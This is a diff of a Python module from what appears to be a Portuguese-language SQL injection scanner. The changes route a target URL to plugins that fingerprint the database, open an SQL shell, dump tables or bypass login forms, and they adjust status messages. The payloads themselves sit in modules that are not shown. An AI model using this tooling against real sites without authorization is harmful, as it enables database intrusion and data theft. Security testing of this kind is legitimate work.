@@ -2,6 +2,8 @@
 ## começar por testes de injeção sql baseada no tempo... criar um jit
 from asyncore import read
 from datetime import datetime
+
+from responses import target
 from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE, TARGET_VULNERABLE
 
 
@@ -97,29 +99,33 @@ def _sqlInjection(target_url, response, _shell, _dump_tables, _dump_all, bypass_
                                         print("\t%s: %s  " % (header_perc, result))
                                     except Exception as error:
                                         print("\t%s : não encontrado" % header_perc)
-                                try:
-                                    print("\tSGBD alvo: MYSQL")        
+                                try:     
                                     print("\tVersão do SGBD: %s" %server_fingerprint[1])
                                     print("\tSistema backend (OS) do SGBD: %s" %server_fingerprint[2])
                                     print("\tNome do usuário do banco de dados: %s" %database_user_fingerprint[2])
                                     print("\tNome do banco de dados: %s" %database_user_fingerprint[1])
+                                    print(color.admin_side+"\t[Estado]::Alvo vulnerável"+color.end)   
                                 #print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
                                 except KeyError:
+                                    print("\tSGBD alvo: MYSQL")   
+                                    print(color.admin_side+"\t[Estado]::AAlvo vulnerável:"+color.end)   
                                     pass
                                 print(" ----------")
-                                ## termino do relatório
+                                
+                                if not _shell and not _dump_tables and not _dump_all:
+                                    ## termino do relatório
+                                    ####################################################
+                                    from mode.plugin.tablesEnum import simpleTest      #
+                                    simpleTest(target_url)                             #
+                                    ####################################################
+                                else:
+                                    pass
                                 try:
                                     database_user_fingerprint[2] = database_user_fingerprint[2].split('@' )
                                 except KeyError as e:
                                     database_user_fingerprint[2] = "Não encontrada"
                                     pass
-                                    '''
-                                    ## tentando connecctar ao banco de dados ainda nã está funcionanndo:
-                                    mysql_server_ip =  _socket(target_url)
-                                    conexao = _connectMYSQL(mysql_server_ip, database_user_fingerprint[2][0], '')
-                                    ## criar uma condição aqui, pra caso o usuário desejar apenas testar se o alvo é vulnerável ou não
-                                    
-                                    '''
+                                   
                                 if _shell:
                                     from mode.plugin.tablesEnum import sqlShell
                                     sqlShell(target_url)
@@ -135,6 +141,7 @@ def _sqlInjection(target_url, response, _shell, _dump_tables, _dump_all, bypass_
                                     from mode.plugin.tablesEnum import dumpAll
                                     dumpAll(target_url)    # enumera todas as tables do banco de dados
                                     #################################################################################
+                                exitTheProgram()
                             else:
                                 
                                 ### ver muito bem essa parte
@@ -149,26 +156,37 @@ def _sqlInjection(target_url, response, _shell, _dump_tables, _dump_all, bypass_
                     Faz o teste sqli nos campos de formulários filtrados 👇👇👇👇👇👇👇👇👇
                     '''
                     print("\n"+color.info_1+color.red_0+color.info_2+"[", datetime.now(),"]  Aviso: variáveis URL não encontrado. Será usada campos inputs..."+color.end)
-                    print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Procurando por formulários..."+color.end)
+                    print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Enumerando formulários..."+color.end)
                     
                     main_requesition = requests.get(url=target_url)
                     main_requesition_parsed = BeautifulSoup(main_requesition.content, 'html.parser')
     
                     forms = main_requesition_parsed.find_all('form')
                     if forms:
-                        if response and bypass_auth:
+                        if response:
+                            print(color.info_1+color.red_0+color.info_2+"[", datetime.now(),"]  Aviso: complementando o parâmetro -auth_bypass"+color.end)
+                            pass
+                        elif bypass_auth:
+                            print(color.info_1+color.red_0+color.info_2+"[", datetime.now(),"]  Aviso: este parâmetro requer a flag -r/--response, reexecute juntamente com ele"+color.end)
+                            exitTheProgram()
+                        elif response and bypass_auth:
                             pass
                         else:
                             if _shell:
                                 from mode.plugin.tablesEnum import sqlShell
                                 sqlShell(target_url)
-                            if _dump_tables:
+                            elif _dump_tables:
                                 from mode.plugin.tablesEnum import dump_tables
                                 dump_tables(target_url)
-                            if _dump_all:
+                            elif _dump_all:
                                 from mode.plugin.tablesEnum import dumpAll
                                 dumpAll(target_url)
-                                   
+                            else:
+                                ####################################################
+                                from mode.plugin.tablesEnum import simpleTest      #
+                                simpleTest(target_url)                             #
+                                exitTheProgram()                                   #
+                                ####################################################
                     else:
                         print(color.orange+"[!][", datetime.now() ,"]  Aviso:  O alvo  não contêm campos onde se possa introduzir dados..."+color.end)  
                         exitTheProgram()
@@ -206,7 +224,7 @@ def _sqlInjection(target_url, response, _shell, _dump_tables, _dump_all, bypass_
                                 ## monta a url de validação dos dados
                                 post_target_url = url_exploded[0]+'//'+url_exploded[2]+'/'+validation_page[user_option]
                                 ## avança na execução conforme instruido pelo o usuário
-                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] " +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
+                                print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] " +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
                                 input_tag = array_form[user_option].find_all({'input'})
                                 ## testa a existencia da interação da página de login, caso não seja passada, solicite que se passe
                                 
